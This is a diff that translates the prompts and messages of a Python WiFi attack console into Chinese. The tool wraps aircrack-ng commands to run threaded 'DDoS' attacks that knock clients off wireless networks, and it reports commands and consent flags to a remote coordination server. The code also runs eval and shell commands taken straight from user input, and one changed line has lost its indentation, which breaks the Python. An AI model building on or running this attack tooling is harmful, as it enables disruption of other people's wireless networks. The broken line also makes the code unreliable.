@@ -73,14 +73,14 @@ class Main:
 		system("clear || cls")
 
 		if "/" not in popen("command -v airmon-ng").read() or "/" not in popen("command -v airodump-ng").read() or "/" not in popen("command -v aireplay-ng").read():
-			input("\n[i] Please install aircrack-ng to continue.\n[Press Enter to continue]")
+			input("\n[i] 请安装 aircrack-ng 以继续。\n[按回车继续]")
 			system("clear || cls")
 			var.stop()
 			return
 
 		if geteuid_exists:
 			if geteuid() != 0:
-				input("\n[i] Please run with sudo privileges.\n[Press Enter to continue]")
+				input("\n[i] 请使用 sudo 权限运行。\n[按回车继续]")
 				system("clear || cls")
 				var.stop()
 				return
@@ -98,17 +98,17 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		self.help()
 
 	def exit_console(self):
-		print("Have a nice day.")
+		print("祝您有美好的一天。")
 		quit()
 
 	def run_shell(self, command):
 		print("")
-		system(tools.arg("Enter shell command: ", ". ", command))
+		system(tools.arg("输入 shell 命令：", ". ", command))
 		print("")
 
 	def debug(self, command):
 		print("")
-		eval(tools.arg("Enter debug command: ", "$ ", command))
+		eval(tools.arg("输入调试命令：", "$ ", command))
 		print("")
 
 	@event.command
@@ -122,7 +122,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	@event.event
 	def on_command_not_found(command):
 		print("")
-		print("The command you entered does not exist.")
+		print("您输入的命令不存在。")
 		print("")
 
 	def check_session(self):
@@ -163,71 +163,71 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
 			if status != "200":
 				print("")
-				print("An error occured, while sending commands to the server.")
+				print("发送命令到服务器时发生错误。")
 				print("")
 
 	@event.command
 	def debug():
 		var.wifi_debug = True
 		print("")
-		print("Debugging mode enabled.")
+		print("调试模式已启用。")
 		print("")
 
 	def show_values(self):
 		print("")
-		print("Interface: %s" % var.interface)
-		print("ESSID: %s" % var.essid)
-		print("BSSID: %s" % var.bssid)
-		print("MON: %s" % var.mon)
-		print("Channel: %s" % var.channel)
-		print("Threads: %s" % var.threads)
+		print("接口：%s" % var.interface)
+		print("ESSID：%s" % var.essid)
+		print("BSSID：%s" % var.bssid)
+		print("监控接口：%s" % var.mon)
+		print("信道：%s" % var.channel)
+		print("线程：%s" % var.threads)
 		print("")
 
 	def help(self):
-		event.help_title("\x1b[1;39mWIFI Help:\x1b[0;39m")
+		event.help_title("\x1b[1;39mWIFI 帮助：\x1b[0;39m")
 		tools.help("|-- ", " :: ", event)
 		print("")
 
 	@event.command
 	def bssid(command):
 		print("")
-		var.bssid = tools.arg("BSSID: ", "bssid ", command)
+		var.bssid = tools.arg("BSSID：", "bssid ", command)
 		print("")
 
 	@event.command
 	def interface(command):
 		print("")
-		var.interface = tools.arg("Interface: ", "interface ", command)
+		var.interface = tools.arg("接口：", "interface ", command)
 		print("")
 
 	@event.command
 	def essid(command):
 		print("")
-		var.essid = tools.arg("BSSID: ", "essid ", command)
+		var.essid = tools.arg("ESSID：", "essid ", command)
 		print("")
 
 	@event.command
 	def mon(command):
 		print("")
-		var.mon = tools.arg("MON: ", "mon ", command)
+		var.mon = tools.arg("监控接口：", "mon ", command)
 		print("")
 
 	@event.command
 	def channel(command):
 		print(" ")
 		try:
-			var.channel = int(tools.arg("Channel: ", "channel ", command))
+			var.channel = int(tools.arg("信道：", "channel ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("执行时发生错误。", e)
 		print(" ")
 
 	@event.command
 	def threads(command):
 		print(" ")
 		try:
-			var.threads = int(tools.arg("Threads: ", "threads ", command))
+			var.threads = int(tools.arg("线程数：", "threads ", command))
 		except Exception as e:
-			print("There was an error while executing.", e)
+			print("执行时发生错误。", e)
 		print(" ")
 
 	@event.command
@@ -240,8 +240,8 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			sleep(3)
 			system("sudo airodump-ng %s &" % var.mon)
 		except Exception as ex:
-			var.command_log.append("ERROR: %s" % ex)
-			print("ERROR: %s" % ex)
+var.command_log.append("错误：%s" % ex)
+				print("错误：%s" % ex)
 		print("")
 
 	def ddos(self):
@@ -254,7 +254,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def run():
 		def execute():
 			print("")
-			print("To stop the attack press: ENTER or CTRL + C")
+			print("停止攻击请按：ENTER 或 CTRL + C")
 			print("")
 
 			var.ps1 = ""  # Change due to threading bug.
@@ -264,17 +264,17 @@ C_B----------------------------------------------------------C_W""").replace("C_
 				t = Thread(target=self.dump)
 				t.start()
 			except Exception:
-				print("Could not start thread.")
+				print("无法启动线程。")
 			sleep(2)
 			for thread in range(var.threads):
 				try:
 					t = Thread(target=self.ddos)
 					t.start()
 				except Exception:
-					print("Could not start thread %s." % thread)
+					print("无法启动线程 %s。" % thread)
 
 			def reset_attack():
-				print("Stopping threads...")
+				print("正在停止线程...")
 				system("sudo killall airplay-ng")
 				system("sudo airmon-ng stop %s" % var.interface)
 				system("sudo ifconfig %s up" % var.interface)
@@ -296,7 +296,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					output_file.write(str(version + "\n"))
 					output_file.write(str("\n".join(var.command_log)))
 					output_file.close()
-				print("Done.")
+				print("完成。")
 				quit()
 
 			def check_stopped_execution():
@@ -318,7 +318,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			if var.server[0] and var.server[1]:
 				status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
 				if status != "200":
-					print("An error occured, while sending data to the server.")
+					print("发送数据到服务器时发生错误。")
 
 			reset_attack()
 
@@ -330,27 +330,27 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					break
 				else:
 					sleep(1)
-		elif not tools.question("\nDo you agree to the terms of use?"):
-			print("Agreement not accepted.")
+		elif not tools.question("\n您是否同意使用条款？"):
+			print("未接受协议。")
 			quit()
 		else:
 			if var.server[0] and var.server[1]:
-				if tools.question("\nWould you like to use the host as part of the ddos?"):
+				if tools.question("\n您是否希望将主机用作 DDoS 的一部分？"):
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("发送数据到服务器时发生错误。")
 					execute()
 				else:
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("发送数据到服务器时发生错误。")
 					try:
-						print("[Press Enter to stop the attack.]")
+						print("[按回车停止攻击。]")
 					except KeyboardInterrupt:
 						pass
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("发送数据到服务器时发生错误。")
 			else:
 				execute()
 
